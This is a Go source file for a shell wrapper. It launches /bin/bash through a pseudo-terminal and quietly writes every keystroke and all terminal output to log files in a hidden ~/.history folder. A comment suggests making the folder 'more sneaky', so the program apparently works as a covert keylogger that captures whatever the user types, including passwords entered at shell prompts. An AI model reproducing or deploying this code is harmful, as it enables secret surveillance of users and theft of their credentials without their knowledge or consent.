package main

import (
	"fmt"
	"io"
	"io/fs"
	"os"
	"os/exec"
	"os/signal"
	"os/user"
	"path"
	"path/filepath"
	"strings"
	"syscall"

	"github.com/creack/pty"
	"golang.org/x/term"
)

var (
	logDir  = ".history"
	binName = "/bin/bash"
)

func getLogNames() (logFiles []string, err error) {
	pid := os.Getpid()
	bin := filepath.Base(os.Args[0])
	usr, err := user.Current()
	if err != nil {
		return
	}

	// Log to a hidden folder in the user's home directory.
	// Can be changed to something more sneaky.
	histDir := path.Join(usr.HomeDir, logDir)
	err = os.Mkdir(histDir, 0755)
	if err != nil {
		switch err.(type) {
		case *fs.PathError:
			err = nil
			// dir exists
		default:
			return
		}
	}

	stdio := path.Join(histDir, fmt.Sprintf("%s.%d.i.log", bin, pid))
	stdout := path.Join(histDir, fmt.Sprintf("%s.%d.o.log", bin, pid))
	logFiles = append(logFiles, stdio, stdout)
	return
}

func run() (err error) {
	// Create arbitrary command.
	var c *exec.Cmd
	if len(os.Args) > 1 {
		c = exec.Command(binName, os.Args[1:]...)
	} else {
		c = exec.Command(binName)
	}

	// Start the command with a pty.
	ptmx, err := pty.Start(c)
	if err != nil {
		return
	}
	defer ptmx.Close()

	// Handle pty size.
	ch := make(chan os.Signal, 1)
	signal.Notify(ch, syscall.SIGWINCH)

	go func(sigCh chan os.Signal) {
		for range sigCh {
			pty.InheritSize(os.Stdin, ptmx)
		}
	}(ch)

	ch <- syscall.SIGWINCH // Initial resize.

	logFiles, err := getLogNames()
	if err != nil {
		return
	}

	// Set stdin in raw mode.
	oldState, err := term.MakeRaw(int(os.Stdin.Fd()))
	if err != nil {
		return
	}
	defer term.Restore(int(os.Stdin.Fd()), oldState)

	flags := os.O_APPEND | os.O_CREATE | os.O_WRONLY
	g, err := os.OpenFile(logFiles[0], flags, 0644)
	if err != nil {
		return
	}
	defer g.Close()

	f, err := os.OpenFile(logFiles[1], flags, 0644)
	if err != nil {
		return
	}
	defer f.Close()

	f.WriteString(strings.Join(os.Args, " ") + "\n")
	wInout := io.MultiWriter(ptmx, g)
	wOutErr := io.MultiWriter(os.Stdout, f)

	// Copy stdin to the pty and the pty to stdout.
	// Note: You can attempt to unify stdio streams,
	//       but stdout gets a copy of stdin on carriage
	//       return, leading to double type. Hence, 2
	//       files are required.
	go func(wr io.Writer) {
		io.Copy(wr, os.Stdin)
	}(wInout)

	io.Copy(wOutErr, ptmx)

	return
}

func main() {
	if err := run(); err != nil {
		fmt.Println(err) //DEBUG ONLY
	}
}
